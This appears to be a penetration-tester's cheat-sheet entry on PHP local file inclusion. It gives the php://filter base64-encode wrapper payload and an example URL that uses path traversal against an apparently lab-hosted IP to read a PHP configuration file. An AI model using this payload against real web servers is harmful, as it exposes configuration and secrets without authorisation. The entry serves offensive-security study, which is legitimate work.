# php://filter/read=convert.base64-encode/resource=config

OS: PHP, Web
Description: PHP Read local File
Security Domains: Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21), LFI (https://www.notion.so/LFI-1434c8e523768048913dcfcd434b772b?pvs=21)
Target_Technology: php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21)

Example:

```jsx
http://83.136.253.251:41973/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
```